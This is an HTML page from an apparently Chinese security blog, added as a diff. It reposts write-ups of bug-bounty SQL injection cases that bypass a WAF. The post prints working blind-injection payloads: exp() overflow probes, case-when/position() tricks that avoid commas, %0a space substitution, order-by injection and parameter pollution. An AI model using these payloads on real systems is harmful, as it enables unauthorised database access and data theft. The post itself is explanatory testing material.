@@ -1,0 +1,916 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="X1ly?S">
+  <meta name="keywords" content="网络安全 渗透测试">
+  
+    <meta name="description" content="来源：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;i92dNJxeOzO--SqZmg4LGA  case when+position绕过 找到注入点，statusCode参数，单引号报错    使用exp()报错确定注入的存在  1&#x27;||exp(709)||&#x27;  # exp(709)没有整数溢出，返回为真，没有报错，返回了正常数据   1&#x27;||exp(7">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SRC案例-几个sql注入绕WAF案例">
+<meta property="og:url" content="https://example.com/2024/11/10/SRC%E6%A1%88%E4%BE%8B-%E5%87%A0%E4%B8%AAsql%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/index.html">
+<meta property="og:site_name" content="X1ly?S Blog">
+<meta property="og:description" content="来源：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;i92dNJxeOzO--SqZmg4LGA  case when+position绕过 找到注入点，statusCode参数，单引号报错    使用exp()报错确定注入的存在  1&#x27;||exp(709)||&#x27;  # exp(709)没有整数溢出，返回为真，没有报错，返回了正常数据   1&#x27;||exp(7">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/cmwrtqh7M6RQgkp.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/ODReghN3dayJSLG.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/EBuzjL9N4apSF3M.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/cVUmvTjgP32tkzX.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/4GMVHgKW3aNf5uQ.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/nCu4D5LcENwlkVh.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/iaZDFyCS7NIzeXp.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/vs7cD1XfeRknKbl.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/Bbo5RCUIOfSc9lJ.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/kJ92mG6uq1dvM4L.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/fZpXq7Q2UhKi6o5.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/5IKVx2WtQhU8ZPj.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/avFSposPNeVjbR3.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/BrOyts3p8XTw1AV.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/XhsH5EF6nYTMija.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/DrZY9vgIMy5jnbR.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/nrZVkiCBEQsR1a8.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/r5abtNZRdyckjT4.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/9iPGmOnvF4SBaQ1.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/AD6qXOywERCkjIG.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/Ko3tPSOGUVFi7sf.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/DbqFnHKvBroX3EO.png">
+<meta property="og:image" content="c:/Users/23822/AppData/Roaming/Typora/typora-user-images/image-20241110220834449.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/9RWrlMjxViLtIBP.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/8tULBYeciZwyS9M.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/i7etAJFnbEdDspP.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/JxXNCnWUycfhBuH.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/RtsIKBxzGdfb4LO.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/xGToFHhZwaDUQJ4.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/ECzOSb6c7rujq2s.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/DAlEoqpO1YBPWx4.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/10/dVoFjKykP21em3U.png">
+<meta property="article:published_time" content="2024-11-10T15:26:43.000Z">
+<meta property="article:modified_time" content="2024-11-10T15:28:01.146Z">
+<meta property="article:author" content="X1ly?S">
+<meta property="article:tag" content="几个sql注入绕WAF案例">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2024/11/10/cmwrtqh7M6RQgkp.png">
+  
+  
+  
+  <title>SRC案例-几个sql注入绕WAF案例 - X1ly?S Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":"flase","scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"PYTHON"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"f0DHnqSCglihztWD5hnI8OS8-gzGzoHsz","app_key":"M3h6WgzFRHqbQjc4e8jWn6Ix","server_url":"https://f0dhnqsc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>X1ly?S Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SRC案例-几个sql注入绕WAF案例"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        X1ly?S
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-10 23:26" pubdate>
+          2024年11月10日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SRC案例-几个sql注入绕WAF案例</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年11月10日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>来源：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/i92dNJxeOzO--SqZmg4LGA">https://mp.weixin.qq.com/s/i92dNJxeOzO--SqZmg4LGA</a></p>
+</blockquote>
+<h2 id="case-when-position绕过"><a href="#case-when-position绕过" class="headerlink" title="case when+position绕过"></a>case when+position绕过</h2><ol>
+<li>找到注入点，statusCode参数，单引号报错</li>
+</ol>
+<p><img src="https://s2.loli.net/2024/11/10/cmwrtqh7M6RQgkp.png" srcset="/img/loading.gif" lazyload alt="image-20241110163124314"></p>
+<ol start="2">
+<li>使用exp()报错确定注入的存在</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;||exp(709)||&#x27;</span>  # <span class="hljs-built_in">exp</span>(<span class="hljs-number">709</span>)没有整数溢出，返回为真，没有报错，返回了正常数据<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/ODReghN3dayJSLG.png" srcset="/img/loading.gif" lazyload alt="image-20241110163600360"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;||exp(710)||&#x27;</span>  # <span class="hljs-built_in">exp</span>(<span class="hljs-number">710</span>)整数溢出，返回为假，报错，返回了异常，确定了注入的存在<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/EBuzjL9N4apSF3M.png" srcset="/img/loading.gif" lazyload alt="image-20241110163743425"></p>
+<ol start="3">
+<li>接下来，测试各种函数的可用性，让函数都返回1，从而看是否禁用该函数</li>
+</ol>
+<p>if()被禁用</p>
+<p><img src="https://s2.loli.net/2024/11/10/cVUmvTjgP32tkzX.png" srcset="/img/loading.gif" lazyload alt="image-20241110164206941"></p>
+<p>decode()被禁用</p>
+<p><img src="https://s2.loli.net/2024/11/10/4GMVHgKW3aNf5uQ.png" srcset="/img/loading.gif" lazyload alt="image-20241110164225743"></p>
+<p>case when 也是异常</p>
+<p><img src="https://s2.loli.net/2024/11/10/nCu4D5LcENwlkVh.png" srcset="/img/loading.gif" lazyload alt="image-20241110164610925"></p>
+<ol start="4">
+<li>但是经过尝试，其实换个写法就可以了，不写”&#x3D;”了，成功回显出了正常数据，说明是＝出现了问题，但又不是简单地被过滤了，很有可能它有个规则是在一些符号传进去之后会在后面加了一些字符导致语句异常。</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;||case 1 when 1 then 1 esle 1 end||&#x27;</span>  # 返回永真<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/iaZDFyCS7NIzeXp.png" srcset="/img/loading.gif" lazyload alt="image-20241110165013370"></p>
+<p>换成exp(710)使得表达式为假，验证一下，成功返回异常，说明case when可用！</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;|| case 1 when 2 then 1 else exp(710)||&#x27;</span> # 返回为假<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/vs7cD1XfeRknKbl.png" srcset="/img/loading.gif" lazyload alt="image-20241110165724390"></p>
+<ol start="5">
+<li>选择盲注，开始测试盲注函数的可用性</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;|| case ascii(substr(user,1,1)) when 1 then 1 else 1||&#x27;</span> # 返回永真，测试语句是否被禁用<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/Bbo5RCUIOfSc9lJ.png" srcset="/img/loading.gif" lazyload alt="image-20241110171650656"></p>
+<p>结果是被禁用了，但是具体是什么部分被禁用了呢？</p>
+<ol start="6">
+<li>进一步测试，是哪一部分被禁用了</li>
+</ol>
+<p>先换成length函数，单独测试user，返回正常，说明user是没被过滤的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;||case length(user) when 1 then 1 else 1 ||&#x27;</span> <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/kJ92mG6uq1dvM4L.png" srcset="/img/loading.gif" lazyload alt="image-20241110172042963"></p>
+<p>那么可以先跑user的长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;||case length(user) when 【FUZZ】 then 1 else exp(710) ||&#x27;</span> <br></code></pre></td></tr></table></figure>
+
+<p>直接跑出来user为8位</p>
+<p><img src="https://s2.loli.net/2024/11/10/fZpXq7Q2UhKi6o5.png" srcset="/img/loading.gif" lazyload alt="image-20241110172355367"></p>
+<p>再来单独测试下ascii函数，这里发现没问题</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;||case ascii(user) when 1 then 1 else 1 ||&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/5IKVx2WtQhU8ZPj.png" srcset="/img/loading.gif" lazyload alt="image-20241110172447799"></p>
+<p>经测试，substr()单独也可用，过滤的是逗号，不是函数</p>
+<ol start="7">
+<li>于是尝试绕过逗号</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">substring</span>(<span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>) # 代表从第一位开始，截取长度为<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/avFSposPNeVjbR3.png" srcset="/img/loading.gif" lazyload alt="image-20241110172815291"></p>
+<p>结果所有逗号绕过都失败了，只能想其他办法</p>
+<ol start="8">
+<li>继续绕过限制</li>
+</ol>
+<p>之前一直以为是orcale数据库，现在怀疑它是PostgreSQL数据库，PostgreSQL有个函数很少会禁: position函数，mysql中也有此函数，这个函数不需要逗号</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">这个函数有两个参数，返回的是第一个参数第一次出现在后面的位置<br><span class="hljs-built_in">position</span>(<span class="hljs-string">&#x27;sql&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;postgresql&#x27;</span>)返回的是<span class="hljs-number">8</span><br><span class="hljs-built_in">position</span>(<span class="hljs-string">&#x27;sq&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;postgresql&#x27;</span>)返回的也是<span class="hljs-number">8</span><br><span class="hljs-built_in">position</span>(<span class="hljs-string">&#x27;p&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;postgresql&#x27;</span>)返回的则是<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>这里返回的就是数字，也不用ascii函数了，最终payload为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;||case position(&#x27;</span>【FUZZ2】<span class="hljs-string">&#x27; in user) when 【FUZZ1】 then 1 else exp(720) end||&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>先固定【FUZZ1】为1，也就是先跑user的第一位是什么字母，去FUZZ【FUZZ2】如果匹配，逻辑会走then 返回1，回显正常数据，反之回显异常，这样就能盲注成功了！</p>
+<p><img src="https://s2.loli.net/2024/11/10/BrOyts3p8XTw1AV.png" srcset="/img/loading.gif" lazyload alt="image-20241110173716698"></p>
+<ol start="9">
+<li>接下来就是一位一位的跑，成功得到了user数据！</li>
+</ol>
+<h2 id="排序点注入"><a href="#排序点注入" class="headerlink" title="排序点注入"></a>排序点注入</h2><ol>
+<li>排序点处</li>
+</ol>
+<p><img src="https://s2.loli.net/2024/11/10/XhsH5EF6nYTMija.png" srcset="/img/loading.gif" lazyload alt="image-20241110215000839"></p>
+<ol start="2">
+<li>原有数据包</li>
+</ol>
+<p><img src="https://s2.loli.net/2024/11/10/DrZY9vgIMy5jnbR.png" srcset="/img/loading.gif" lazyload alt="image-20241110215043303"></p>
+<ol start="3">
+<li>使用case when语句确定注入的存在</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-built_in">exp</span>(<span class="hljs-number">710</span>) # 返回<span class="hljs-number">1</span>，回显正常<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/nrZVkiCBEQsR1a8.png" srcset="/img/loading.gif" lazyload alt="image-20241110215320990"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-built_in">exp</span>(<span class="hljs-number">710</span>) # 返回<span class="hljs-built_in">exp</span>(<span class="hljs-number">710</span>)，整数溢出，回显异常<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/r5abtNZRdyckjT4.png" srcset="/img/loading.gif" lazyload alt="image-20241110215408520"></p>
+<p>经过测试，基本没有什么过滤，那么直接盲注，注出一条数据就行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> ascii(substr(<span class="hljs-keyword">user</span>,【FUZZ】,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span>【FUZZ】 <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-built_in">exp</span>(<span class="hljs-number">710</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/9iPGmOnvF4SBaQ1.png" srcset="/img/loading.gif" lazyload alt="image-20241110215831801"></p>
+<h2 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h2><ol>
+<li>原本数据包，很明显的order by注入</li>
+</ol>
+<p><img src="https://s2.loli.net/2024/11/10/AD6qXOywERCkjIG.png" srcset="/img/loading.gif" lazyload alt="image-20241110220049665"></p>
+<ol start="2">
+<li>这里直接插入一个比较大的数字，ordey by 100，没有这么多列就会报错，说明注入存在</li>
+</ol>
+<p><img src="https://s2.loli.net/2024/11/10/Ko3tPSOGUVFi7sf.png" srcset="/img/loading.gif" lazyload alt="image-20241110220128617"></p>
+<ol start="3">
+<li>因为是有报错回显，这里直接插入updatexml()试下</li>
+</ol>
+<p>结果直接被拦截了，主机无响应，其他函数都试了，都是无响应</p>
+<p><img src="https://s2.loli.net/2024/11/10/DbqFnHKvBroX3EO.png" srcset="/img/loading.gif" lazyload alt="image-20241110220240999"></p>
+<ol start="4">
+<li>还是得换盲注，首先就是确定哪些判断函数可以用</li>
+</ol>
+<p>经过测试，发现很多都过滤了，最终构造如下payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">case</span> <span class="hljs-number">1</span> <span class="hljs-keyword">when</span> <span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) <span class="hljs-keyword">asc</span> # 返回<span class="hljs-number">1</span>，应该回显正常数据<br></code></pre></td></tr></table></figure>
+
+<p>空格被过滤，使用%0a来代替空格，返回数据证明语句没问题</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">case</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>a1<span class="hljs-operator">%</span><span class="hljs-number">0</span>awhen<span class="hljs-operator">%</span><span class="hljs-number">0</span>a1<span class="hljs-operator">%</span><span class="hljs-number">0</span>athen<span class="hljs-operator">%</span><span class="hljs-number">0</span>a1<span class="hljs-operator">%</span><span class="hljs-number">0</span>aelse<span class="hljs-operator">%</span><span class="hljs-number">0</span>a1<span class="hljs-operator">%</span><span class="hljs-number">0</span>aend) <span class="hljs-keyword">asc</span> <br></code></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/23822/AppData/Roaming/Typora/typora-user-images/image-20241110220834449.png" srcset="/img/loading.gif" lazyload alt="image-20241110220834449"></p>
+<ol start="5">
+<li>接下来就是构造真假条件，控制输出数据</li>
+</ol>
+<p>注意！当”then exp(900) else 1”语句中， 如果”else”后面为数字，就不会执行exp(900)这个函数，order by又不能接普通的字符，必须是有效的列名字段，于是else后面改为一个有效的字段</p>
+<p>先是换成<strong>CREATE_TIME</strong>不管条件是否相等都返回数据类型不一致</p>
+<p><img src="https://s2.loli.net/2024/11/10/9RWrlMjxViLtIBP.png" srcset="/img/loading.gif" lazyload alt="image-20241110221705936"></p>
+<p>于是去报错信息中寻找其他有效字段名</p>
+<p><img src="https://s2.loli.net/2024/11/10/8tULBYeciZwyS9M.png" srcset="/img/loading.gif" lazyload alt="image-20241110221739455"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">case</span> <span class="hljs-number">1</span> <span class="hljs-keyword">when</span> <span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <span class="hljs-built_in">exp</span>(<span class="hljs-number">900</span>) <span class="hljs-keyword">else</span> PROVINCE_ID <span class="hljs-keyword">end</span>) <span class="hljs-keyword">asc</span><br></code></pre></td></tr></table></figure>
+
+<p>成功执行了exp(900)，返回了数字溢出</p>
+<p><img src="https://s2.loli.net/2024/11/10/i7etAJFnbEdDspP.png" srcset="/img/loading.gif" lazyload alt="image-20241110221900902"></p>
+<p>所以当case 1  when 2时，就返回按照PROVINCE_ID排序的结果，当case 2  when 2时，会回显异常，条件构造成功！</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">case</span> <span class="hljs-number">1</span> <span class="hljs-keyword">when</span> <span class="hljs-number">2</span> <span class="hljs-keyword">then</span> <span class="hljs-built_in">exp</span>(<span class="hljs-number">900</span>) <span class="hljs-keyword">else</span> PROVINCE_ID <span class="hljs-keyword">end</span>) <span class="hljs-keyword">asc</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/11/10/JxXNCnWUycfhBuH.png" srcset="/img/loading.gif" lazyload alt="image-20241110224247192"></p>
+<ol start="6">
+<li>下面就可以使用substr()截取user，注出数据了</li>
+</ol>
+<p>但是经过测试，过滤了逗号</p>
+<p>使用参数污染绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">case</span> SUBSTRB(<span class="hljs-keyword">USER</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">when</span> <span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <span class="hljs-built_in">exp</span>(<span class="hljs-number">900</span>) <span class="hljs-keyword">else</span> PROVINCE_ID <span class="hljs-keyword">end</span>) <span class="hljs-keyword">asc</span> # 原始payload<br><br>orderByClause<span class="hljs-operator">=</span>(<span class="hljs-keyword">case</span> SUBSTRB(<span class="hljs-keyword">USER</span><span class="hljs-operator">&amp;</span>orderByClause<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>orderByClause<span class="hljs-operator">=</span><span class="hljs-number">1</span>) <span class="hljs-keyword">when</span> <span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <span class="hljs-built_in">exp</span>(<span class="hljs-number">900</span>) <span class="hljs-keyword">else</span> PROVINCE_ID <span class="hljs-keyword">end</span>) <span class="hljs-keyword">asc</span> # 参数污染绕过逗号<br><br>orderByClause<span 